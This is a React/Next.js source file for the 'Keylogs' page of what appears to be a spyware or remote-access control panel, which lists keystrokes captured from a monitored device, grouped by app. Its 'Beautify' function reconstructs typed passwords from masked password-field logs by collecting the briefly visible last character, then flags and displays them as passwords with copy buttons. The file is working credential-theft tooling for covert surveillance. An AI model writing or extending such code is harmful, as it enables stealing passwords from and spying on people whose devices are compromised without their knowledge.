'use client';

import { useEffect, useState, useCallback, Suspense, useMemo } from 'react';
import { useSearchParams, useRouter } from 'next/navigation';
import Sidebar from '@/components/layout/Sidebar';
import Header from '@/components/layout/Header';
import { getKeylogs } from '@/lib/api';
import { useAuthStore } from '@/lib/store';
import { format } from 'date-fns';
import { Keyboard, Search, ChevronLeft, ChevronRight, Copy, Check, ArrowLeft, Wand2, Eye, EyeOff, X, Sparkles, Trash2 } from 'lucide-react';
import Link from 'next/link';

export default function KeylogsPage() {
    return (
        <Suspense fallback={null}>
            <KeylogsContent />
        </Suspense>
    );
}

/**
 * Beautify/merge password sequences for a specific app's logs
 * 
 * Logic:
 * 1. Sort chronologically (oldest first)
 * 2. Find sequences that start with plain text followed by dots
 * 3. For each masked entry, extract ONLY the new visible character
 * 4. Skip entries that are ONLY dots (no new char)
 * 5. Combine: plain text + all new chars = full password
 * 
 * Example sequence (chronological):
 * "2", "●", "●8", "●●", "●●4", "●●●", "●●●6", "●●●●", "●●●●3", "●●●●●", "●●●●●9", "●●●●●●"
 * Result: "284639"
 */
function beautifyAppLogs(logs: any[]): { extracted: { text: string, startTime: Date, endTime: Date, count: number, isPassword: boolean }[], mergedCount: number, details: string[] } {
    if (!logs || logs.length === 0) return { extracted: [], mergedCount: 0, details: [] };

    // Sort by timestamp (oldest first)
    const sorted = [...logs].sort((a, b) =>
        new Date(a.timestamp).getTime() - new Date(b.timestamp).getTime()
    );

    const extracted: { text: string, startTime: Date, endTime: Date, count: number, isPassword: boolean }[] = [];
    const details: string[] = [];
    let totalMerged = 0;

    let i = 0;
    while (i < sorted.length) {
        const current = sorted[i];
        const text = current.text || '';
        const hasMask = text.includes('•') || text.includes('*') || text.includes('●');

        if (!hasMask) {
            // Plain text - check if next entry starts a password sequence
            const nextIdx = i + 1;
            if (nextIdx < sorted.length) {
                const nextText = sorted[nextIdx].text || '';
                const nextHasMask = nextText.includes('•') || nextText.includes('*') || nextText.includes('●');

                if (nextHasMask) {
                    // This is the start of a password sequence!
                    const startTime = new Date(current.timestamp);
                    let password = text; // Start with the plain text
                    let endTime = startTime;
                    let count = 1;

                    // Process the masked sequence
                    let j = nextIdx;
                    while (j < sorted.length) {
                        const entry = sorted[j];
                        const entryText = entry.text || '';
                        const entryHasMask = entryText.includes('•') || entryText.includes('*') || entryText.includes('●');

                        if (!entryHasMask) {
                            // End of masked sequence
                            break;
                        }

                        // Extract the visible character (non-mask chars)
                        const visibleChars = entryText.replace(/[•*●]/g, '');
                        if (visibleChars.length > 0) {
                            // Take only the last character (the newly typed one)
                            password += visibleChars.slice(-1);
                        }
                        // Skip entries with only dots (no new char)

                        endTime = new Date(entry.timestamp);
                        count++;
                        j++;
                    }

                    if (password.length > 1) {
                        extracted.push({ text: password, startTime, endTime, count, isPassword: true });
                        details.push(`"${password}" (${count} keystrokes, ${formatTimeRange(startTime, endTime)})`);
                        totalMerged += count;
                    }

                    i = j;
                    continue;
                }
            }

            // Regular text, not followed by password sequence
            // Still include it in extracted
            extracted.push({
                text,
                startTime: new Date(current.timestamp),
                endTime: new Date(current.timestamp),
                count: 1,
                isPassword: false
            });
        } else {
            // Starts with mask (no preceding plain text) - process as standalone sequence
            const startTime = new Date(current.timestamp);
            let password = '';
            let endTime = startTime;
            let count = 0;

            let j = i;
            while (j < sorted.length) {
                const entry = sorted[j];
                const entryText = entry.text || '';
                const entryHasMask = entryText.includes('•') || entryText.includes('*') || entryText.includes('●');

                if (!entryHasMask && j > i) {
                    // End of masked sequence
                    break;
                }

                if (entryHasMask) {
                    const visibleChars = entryText.replace(/[•*●]/g, '');
                    if (visibleChars.length > 0) {
                        password += visibleChars.slice(-1);
                    }
                    endTime = new Date(entry.timestamp);
                    count++;
                }
                j++;
            }

            if (password.length > 0) {
                extracted.push({ text: password, startTime, endTime, count, isPassword: true });
                details.push(`"${password}" (${count} keystrokes, ${formatTimeRange(startTime, endTime)})`);
                totalMerged += count;
            } else if (count > 0) {
                // All dots, no visible chars - show as hidden
                extracted.push({ text: `[${count} hidden chars]`, startTime, endTime, count, isPassword: true });
                totalMerged += count;
            }

            i = j;
            continue;
        }

        i++;
    }

    return { extracted, mergedCount: totalMerged, details };
}

function formatTimeRange(start: Date, end: Date): string {
    const startStr = start.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false });
    const endStr = end.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false });
    if (startStr === endStr) return startStr;
    return `${startStr} - ${endStr}`;
}

function KeylogsContent() {
    const router = useRouter();
    const searchParams = useSearchParams();
    const deviceId = searchParams.get('id') as string;
    const { isAuthenticated, isHydrated } = useAuthStore();

    const [keylogs, setKeylogs] = useState<any[]>([]);
    const [pagination, setPagination] = useState({ page: 1, limit: 100, total: 0, pages: 0 });
    const [loading, setLoading] = useState(true);
    const [search, setSearch] = useState('');
    const [copiedId, setCopiedId] = useState<string | null>(null);

    // Beautify modal state
    const [beautifyModal, setBeautifyModal] = useState<{
        open: boolean;
        appName: string;
        result: { extracted: { text: string, startTime: Date, endTime: Date, count: number, isPassword: boolean }[], mergedCount: number, details: string[] } | null;
    }>({ open: false, appName: '', result: null });

    useEffect(() => {
        if (isHydrated && !isAuthenticated) router.push('/login');
    }, [isHydrated, isAuthenticated, router]);

    const fetchKeylogs = useCallback(async (page = 1) => {
        try {
            setLoading(true);
            const data = await getKeylogs(deviceId, page, 100);
            if (data.success) {
                setKeylogs(data.data);
                setPagination(data.pagination);
            }
        } catch (error) {
            console.error('Failed to fetch keylogs:', error);
        } finally {
            setLoading(false);
        }
    }, [deviceId]);

    useEffect(() => {
        if (isAuthenticated && deviceId) fetchKeylogs();
    }, [isAuthenticated, deviceId, fetchKeylogs]);

    const handleCopy = async (text: string, id: string) => {
        try {
            await navigator.clipboard.writeText(text);
            setCopiedId(id);
            setTimeout(() => setCopiedId(null), 2000);
        } catch (err) {
            console.error('Failed to copy:', err);
        }
    };

    const handleBeautify = (appName: string, logs: any[]) => {
        const result = beautifyAppLogs(logs);
        setBeautifyModal({ open: true, appName, result });
    };

    const handleClearApp = async (appName: string) => {
        if (!confirm(`Delete all keylogs from "${appName}"? This cannot be undone.`)) return;

        try {
            const res = await fetch(`${process.env.NEXT_PUBLIC_API_URL || 'http://localhost:3001'}/api/devices/${deviceId}/keylogs?appName=${encodeURIComponent(appName)}`, {
                method: 'DELETE',
            });
            const data = await res.json();
            if (data.success) {
                fetchKeylogs(pagination.page);
            } else {
                alert('Failed to delete keylogs');
            }
        } catch (error) {
            console.error('Failed to delete keylogs:', error);
            alert('Failed to delete keylogs');
        }
    };

    const filteredKeylogs = keylogs.filter(log =>
        search === '' ||
        log.text.toLowerCase().includes(search.toLowerCase()) ||
        (log.appName && log.appName.toLowerCase().includes(search.toLowerCase()))
    );

    const groupedByApp = filteredKeylogs.reduce((acc, log) => {
        const app = log.appName || log.app || 'Unknown App';
        if (!acc[app]) acc[app] = [];
        acc[app].push(log);
        return acc;
    }, {} as Record<string, any[]>);

    if (!isHydrated || !isAuthenticated) return null;

    return (
        <div className="flex min-h-screen bg-[var(--background)]">
            <Sidebar />
            <main className="flex-1 lg:ml-72">
                <Header title="Keylogs" subtitle={`${pagination.total} keystrokes captured`} onRefresh={() => fetchKeylogs(pagination.page)} />

                <div className="p-4 lg:p-8 max-w-5xl mx-auto animate-fade-in">
                    <div className="flex flex-col gap-4 mb-6">
                        <Link href={`/devices/view/?id=${deviceId}`} className="inline-flex items-center gap-2 text-[var(--muted)] hover:text-[var(--foreground)] transition-colors text-sm font-medium w-fit">
                            <ArrowLeft className="w-4 h-4" />
                            Back to Device
                        </Link>
                        <div className="relative">
                            <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-[var(--muted)]" />
                            <input type="text" placeholder="Search keylogs..." value={search} onChange={(e) => setSearch(e.target.value)} className="input pl-11 w-full" />
                        </div>
                    </div>

                    {loading ? (
                        <div className="space-y-4">
                            {[1, 2, 3].map((i) => <div key={i} className="card h-48 skeleton" />)}
                        </div>
                    ) : Object.keys(groupedByApp).length === 0 ? (
                        <div className="card bg-white p-12 text-center">
                            <Keyboard className="w-12 h-12 mx-auto mb-4 text-[var(--muted-light)]" />
                            <h3 className="text-lg font-semibold text-[var(--foreground)] mb-2">No Keylogs Found</h3>
                            <p className="text-[var(--muted)] text-sm">No keystroke data has been captured yet.</p>
                        </div>
                    ) : (
                        <div className="space-y-6">
                            {(Object.entries(groupedByApp) as [string, any[]][]).map(([app, logs]) => (
                                <div key={app} className="card bg-white p-0 overflow-hidden">
                                    <div className="px-5 py-4 bg-[var(--background)] border-b border-[var(--border)] flex items-center justify-between">
                                        <div className="flex items-center gap-3">
                                            <div className="w-10 h-10 rounded-xl bg-orange-50 border border-orange-100 flex items-center justify-center">
                                                <Keyboard className="w-5 h-5 text-orange-500" />
                                            </div>
                                            <div>
                                                <h3 className="font-semibold text-[var(--foreground)]">{app}</h3>
                                                <p className="text-xs text-[var(--muted)]">{logs.length} entries</p>
                                            </div>
                                        </div>

                                        {/* Beautify Button - Per Package */}
                                        <div className="flex items-center gap-2">
                                            <button
                                                onClick={() => handleBeautify(app, logs)}
                                                className="inline-flex items-center gap-2 px-3 py-1.5 rounded-lg text-xs font-medium bg-gradient-to-r from-purple-500 to-pink-500 text-white hover:from-purple-600 hover:to-pink-600 transition-all shadow-md hover:shadow-lg"
                                            >
                                                <Wand2 className="w-3.5 h-3.5" />
                                                Beautify
                                            </button>
                                            <button
                                                onClick={() => handleClearApp(app)}
                                                className="inline-flex items-center gap-2 px-3 py-1.5 rounded-lg text-xs font-medium bg-red-50 border border-red-200 text-red-600 hover:bg-red-100 transition-all"
                                            >
                                                <Trash2 className="w-3.5 h-3.5" />
                                                Clear
                                            </button>
                                        </div>
                                    </div>
                                    <div className="p-3 space-y-2 max-h-80 overflow-y-auto">
                                        {logs.map((log: any) => (
                                            <div key={log.id} className="flex items-start gap-3 p-3 rounded-xl bg-[var(--background)] border border-[var(--border)] group hover:border-[var(--primary)]/30 transition-colors">
                                                <div className="flex-1 min-w-0">
                                                    <div className="flex items-center gap-2">
                                                        <p className="font-mono text-sm text-[var(--foreground)] break-all">{log.text}</p>
                                                        {log.fieldType === 'password' && (
                                                            <EyeOff className="w-3 h-3 text-amber-500 flex-shrink-0" />
                                                        )}
                                                    </div>
                                                    <p className="text-xs text-[var(--muted)] mt-1">{format(new Date(log.timestamp), 'MMM d, HH:mm:ss')}</p>
                                                </div>
                                                <button onClick={() => handleCopy(log.text, log.id)} className="p-2 rounded-lg bg-white border border-[var(--border)] text-[var(--muted)] hover:text-[var(--foreground)] opacity-0 group-hover:opacity-100 transition-all">
                                                    {copiedId === log.id ? <Check className="w-4 h-4 text-emerald-500" /> : <Copy className="w-4 h-4" />}
                                                </button>
                                            </div>
                                        ))}
                                    </div>
                                </div>
                            ))}
                        </div>
                    )}

                    {pagination.pages > 1 && (
                        <div className="flex items-center justify-center gap-4 mt-8">
                            <button onClick={() => fetchKeylogs(pagination.page - 1)} disabled={pagination.page <= 1} className="btn btn-secondary disabled:opacity-30">
                                <ChevronLeft className="w-4 h-4" />
                            </button>
                            <span className="text-sm font-medium text-[var(--foreground)]">Page {pagination.page} of {pagination.pages}</span>
                            <button onClick={() => fetchKeylogs(pagination.page + 1)} disabled={pagination.page >= pagination.pages} className="btn btn-secondary disabled:opacity-30">
                                <ChevronRight className="w-4 h-4" />
                            </button>
                        </div>
                    )}
                </div>
            </main>

            {/* Beautify Result Modal */}
            {beautifyModal.open && (
                <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 backdrop-blur-sm animate-fade-in">
                    <div className="bg-white rounded-2xl shadow-2xl w-full max-w-lg overflow-hidden animate-scale-in">
                        {/* Modal Header */}
                        <div className="px-6 py-4 bg-gradient-to-r from-purple-500 to-pink-500 text-white flex items-center justify-between">
                            <div className="flex items-center gap-3">
                                <div className="w-10 h-10 rounded-xl bg-white/20 flex items-center justify-center">
                                    <Sparkles className="w-5 h-5" />
                                </div>
                                <div>
                                    <h3 className="font-semibold">Beautified Results</h3>
                                    <p className="text-xs text-white/80">{beautifyModal.appName}</p>
                                </div>
                            </div>
                            <button onClick={() => setBeautifyModal({ open: false, appName: '', result: null })} className="p-2 rounded-lg hover:bg-white/20 transition-colors">
                                <X className="w-5 h-5" />
                            </button>
                        </div>

                        {/* Modal Content */}
                        <div className="p-6">
                            {beautifyModal.result && beautifyModal.result.extracted.length > 0 ? (
                                <>
                                    <div className="mb-4 p-3 bg-purple-50 rounded-xl border border-purple-200">
                                        <p className="text-xs text-purple-600 mb-1">Merged {beautifyModal.result.mergedCount} keystrokes into:</p>
                                    </div>

                                    <div className="space-y-3 max-h-64 overflow-y-auto">
                                        {beautifyModal.result.extracted.map((entry, idx) => (
                                            <div key={idx} className={`flex items-center justify-between p-4 rounded-xl border group ${entry.isPassword
                                                    ? 'bg-amber-50 border-amber-200'
                                                    : 'bg-[var(--background)] border-[var(--border)]'
                                                }`}>
                                                <div className="flex-1">
                                                    <div className="flex items-center gap-3">
                                                        <span className={`w-6 h-6 rounded-full text-xs font-bold flex items-center justify-center ${entry.isPassword
                                                                ? 'bg-amber-200 text-amber-700'
                                                                : 'bg-purple-100 text-purple-600'
                                                            }`}>
                                                            {entry.isPassword ? '🔑' : idx + 1}
                                                        </span>
                                                        <code className={`font-mono text-lg font-semibold ${entry.isPassword ? 'text-amber-700' : 'text-[var(--foreground)]'
                                                            }`}>
                                                            {entry.text}
                                                        </code>
                                                        {entry.isPassword && (
                                                            <span className="text-[10px] bg-amber-200 text-amber-700 px-2 py-0.5 rounded-full font-semibold uppercase">
                                                                Password
                                                            </span>
                                                        )}
                                                    </div>
                                                    {entry.count > 1 && (
                                                        <p className={`text-xs mt-1 ml-9 ${entry.isPassword ? 'text-amber-600' : 'text-[var(--muted)]'
                                                            }`}>
                                                            {formatTimeRange(entry.startTime, entry.endTime)} • {entry.count} keystrokes
                                                        </p>
                                                    )}
                                                </div>
                                                <button
                                                    onClick={() => handleCopy(entry.text, `modal-${idx}`)}
                                                    className="p-2 rounded-lg bg-white border border-[var(--border)] text-[var(--muted)] hover:text-[var(--foreground)] transition-all"
                                                >
                                                    {copiedId === `modal-${idx}` ? <Check className="w-4 h-4 text-emerald-500" /> : <Copy className="w-4 h-4" />}
                                                </button>
                                            </div>
                                        ))}
                                    </div>

                                    {beautifyModal.result.details.length > 0 && (
                                        <div className="mt-4 pt-4 border-t border-[var(--border)]">
                                            <p className="text-xs text-[var(--muted)] mb-2">Details:</p>
                                            <ul className="text-xs text-[var(--muted)] space-y-1">
                                                {beautifyModal.result.details.map((detail, idx) => (
                                                    <li key={idx}>• {detail}</li>
                                                ))}
                                            </ul>
                                        </div>
                                    )}
                                </>
                            ) : (
                                <div className="text-center py-8">
                                    <Keyboard className="w-12 h-12 mx-auto mb-4 text-[var(--muted-light)]" />
                                    <h4 className="font-semibold text-[var(--foreground)] mb-2">No Password Sequences Found</h4>
                                    <p className="text-sm text-[var(--muted)]">No masked password patterns detected in this app's keylogs.</p>
                                </div>
                            )}
                        </div>

                        {/* Modal Footer */}
                        <div className="px-6 py-4 bg-[var(--background)] border-t border-[var(--border)] flex justify-end">
                            <button
                                onClick={() => setBeautifyModal({ open: false, appName: '', result: null })}
                                className="btn btn-primary"
                            >
                                Done
                            </button>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
}
